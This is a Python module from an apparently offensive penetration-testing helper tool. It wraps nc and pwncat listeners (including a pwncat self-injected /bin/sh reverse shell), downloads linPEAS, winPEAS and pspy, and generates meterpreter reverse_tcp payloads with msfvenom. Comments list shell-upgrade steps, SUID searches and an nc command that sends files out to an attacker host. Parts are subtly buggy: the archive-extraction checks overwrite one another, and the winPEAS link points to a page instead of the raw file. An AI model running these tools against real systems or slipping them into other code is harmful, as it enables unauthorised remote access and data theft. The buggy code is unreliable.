import logging
import re
from enum import Enum

from ..main import Context
from ..utils.utils import Utils

# ------------------------------------------------------------------------------
#
#
#
# ------------------------------------------------------------------------------


class DownloadWhat(str, Enum):
    LINPEAS = "LINPEAS"
    WINPEAS = "WINPEAS"
    PSPY64 = "PSPY64"


class ToolService:

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def __init__(self, ctx: Context):
        self.ctx: Context = ctx
        self.utils: Utils = self.ctx.utils
        logging.log(logging.DEBUG, 'tool-service is initiated')

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def download(self, what: DownloadWhat):
        service_name = 'WGET'
        self.utils.log_runBanner(service_name)
        path = self.utils.create_service_folder('download')
        logging.log(logging.DEBUG, f'new folder created:: {path}')

        url = None
        if what == DownloadWhat.LINPEAS:
            url = "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"
        elif what == DownloadWhat.WINPEAS:
            url = "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat"
        elif what == DownloadWhat.PSPY64:
            url = "https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64"

        if url != None:
            cmd_result = self.utils.run_command_output_loop(f'nc listening...', [
                ['wget', url, '-P', path]
            ])

        logging.log(logging.INFO, f'[*] {service_name} Done! View the log reports under {path}/')

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    # TODO: add usfull command, to not need to remember all :D
    def info_list():
        pass

        # REVERSE SHELL
        # - start listener
        # + pwncat -l $LPORT -vv --self-inject /bin/sh:$LHOST:$LPORT
        # + nc -lvnp $LPORT
        # - improve
        # + python3 -c 'import pty; pty.spawn("/bin/bash")'
        # + 'Ctr-Z'
        # + stty -a
        # + stty raw -echo; fg
        # + export SHELL=bash;export TERM=xterm-256color;stty rows 19 columns 94

        # SEARCH
        # - find '+s' files
        # + find / -perm -u=s -type f 2>/dev/null
        # - find 'setuid' files
        # + find / -perm -4000 -exec ls -al {} \; 2>/dev/null
        # + getcap -r / 2>/dev/null
        # - find files by specific group
        # + find / -group <GROUP> 2>/dev/null

        # TRANSFER
        # - from target
        # + nc -l -p $LPORT > $FILE
        # + nc -w 3 $LHOST $LPORT < $FILE

    def nc(self, port: int = 9001):
        service_name = 'NC'
        self.utils.log_runBanner(service_name)
        path = self.utils.create_service_folder('tool/nc')
        logging.log(logging.DEBUG, f'new folder created:: {path}')

        use_sudo = []
        if port <= 1024:
            use_sudo = ["sudo"]

        cmd = use_sudo + ['rlwrap', 'nc', '-lvnp', str(port)]
        self.utils.log_runBanner(f'pwncat listening...')
        logging.log(logging.NOTICE, " ".join(cmd))
        self.utils.run_command_endless(command_list=cmd)

        logging.log(logging.INFO, f'[*] {service_name} Done! View the log reports under {path}/')

    def pwncat(self, host: str = None, port: int = 9001):
        service_name = 'PWNCAT'
        self.utils.log_runBanner(service_name)
        path = self.utils.create_service_folder('tool/pwncat')
        logging.log(logging.DEBUG, f'new folder created:: {path}')

        if host == None:
            host = self.utils.get_ip_address()

        use_sudo = []
        if port <= 1024:
            use_sudo = ["sudo"]

        cmd = use_sudo + ['pwncat', '-l', str(port), '-vv', '--self-inject', f'/bin/sh:{host}:{port}']
        self.utils.log_runBanner(f'pwncat listening...')
        logging.log(logging.NOTICE, " ".join(cmd))
        self.utils.run_command_endless(command_list=cmd)

        logging.log(logging.INFO, f'[*] {service_name} Done! View the log reports under {path}/')

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def msfvenom(self, host: str, port: int, format: str = 'dll', file_arch: str = '64', os: str = 'windows'):
        service_name = 'MSFVENOM'
        self.utils.log_runBanner(service_name)
        path = self.utils.create_service_folder('tool/msfvenom')
        logging.log(logging.DEBUG, f'new folder created:: {path}')

        if file_arch == '32':
            reverse_arch = 'x86'
        else:
            reverse_arch = 'x64'

        if os == 'linux':
            # reverse_payload = ['-p', f'linux/{reverse_arch}/shell_reverse_tcp']
            reverse_payload = ['-p', f'linux/{reverse_arch}/meterpreter/reverse_tcp']
        elif os == 'windows':
            # reverse_payload = ['-p', f'windows/{reverse_arch}/shell_reverse_tcp']
            reverse_payload = ['-p', f'windows/{reverse_arch}/meterpreter/reverse_tcp']
        reverse_format = ['-f', format]
        reverse_arch = [f'-a{reverse_arch}']

        cmd_result = self.utils.run_command_output_loop(f'msfvenom create reverse shell...', [
            ['msfvenom'] + reverse_payload + [f'LHOST={host}', f'LPORT={port}', '-o', f'{path}/reverse_shell.{format}'] + reverse_format + reverse_arch
        ])

        logging.log(logging.INFO, f'[*] {service_name} Done! View the log reports under {path}/')

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def pywhat(self, file: str):
        service_name = 'PYWHAT'
        self.utils.log_runBanner(service_name)
        path = self.utils.create_service_folder('tool/pywhat')
        logging.log(logging.DEBUG, f'new folder created:: {path}')

        cmd_result = self.utils.run_command_output_loop(f'extract file...', [
            ['pywhat', file],
            ['tee', f'{path}/pywhat.log']
        ])

        logging.log(logging.INFO, f'[*] {service_name} Done! View the log reports under {path}/')

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def extract(self, file: str):
        service_name = 'EXTRACT'
        self.utils.log_runBanner(service_name)
        path = self.utils.create_service_folder('tool/extract')
        logging.log(logging.DEBUG, f'new folder created:: {path}')

        if '.tar.bz2' in file:
            extract_type = ['tar', 'xjf']
        if '.tar.gz' in file:
            extract_type = ['tar', 'xzf']
        if '.bz2' in file:
            extract_type = ['bunzip2']
        if '.rar' in file:
            extract_type = ['unrar', 'x']
        if '.gz' in file:
            extract_type = ['gunzip']
        if '.tar' in file:
            extract_type = ['tar', 'xf']
        if '.tbz2' in file:
            extract_type = ['tar', 'xjf']
        if '.tgz' in file:
            extract_type = ['tar', 'xzf']
        if '.tar.xz' in file:
            extract_type = ['tar', 'xvfJ']
        if '.zip' in file:
            extract_type = ['unzip']
        if '.Z' in file:
            extract_type = ['uncompress']
        if '.7z' in file:
            extract_type = ['7z', 'x']
        if '.exe' in file:
            extract_type = ['7z', 'x']

        cmd_result = self.utils.run_command_output_loop(f'extract file...', [
            extract_type + [file]
        ])

        logging.log(logging.INFO, f'[*] {service_name} Done! View the log reports under {path}/')
